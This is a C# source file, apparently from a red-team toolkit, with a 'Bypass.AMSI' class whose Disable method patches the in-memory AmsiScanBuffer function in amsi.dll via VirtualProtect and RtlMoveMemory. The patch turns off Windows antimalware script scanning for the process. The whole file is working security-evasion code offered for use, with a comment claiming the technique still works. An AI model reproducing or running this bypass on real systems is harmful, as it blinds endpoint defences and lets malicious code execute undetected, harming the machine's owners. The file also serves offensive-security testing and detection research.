<!--
# -------------------------------------------------------------------------------
# Copyright: (c) BLS OPS LLC.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.
# -------------------------------------------------------------------------------
-->
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
	public class AMSI
	{
		[DllImport("kernel32")]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		[DllImport("kernel32")]
		public static extern IntPtr LoadLibrary(string name);
		[DllImport("kernel32")]
		public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
		static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


		public static int Disable()
		{
			IntPtr TargetDLL = LoadLibrary("amsi.dll");
			if (TargetDLL == IntPtr.Zero)
			{
				Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer.");
				return 1;
			}

			IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
			if (AmsiScanBufferPtr == IntPtr.Zero)
			{
				Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer");
				return 1;
			}

			UIntPtr dwSize = (UIntPtr)5;
			uint Zero = 0;
			if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
			{
				Console.WriteLine("ERROR: Could not change AmsiScanBuffer memory permissions!");
				return 1;
			}

			/*
			 * This is a new technique, and is still working.
			 * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
			 */
			Byte[] Patch = { 0x31, 0xff, 0x90 };
			IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
			Marshal.Copy(Patch, 0, unmanagedPointer, 3);
			MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);

			Console.WriteLine("AmsiScanBuffer patch has been applied.");
			return 0;
		}
	}
}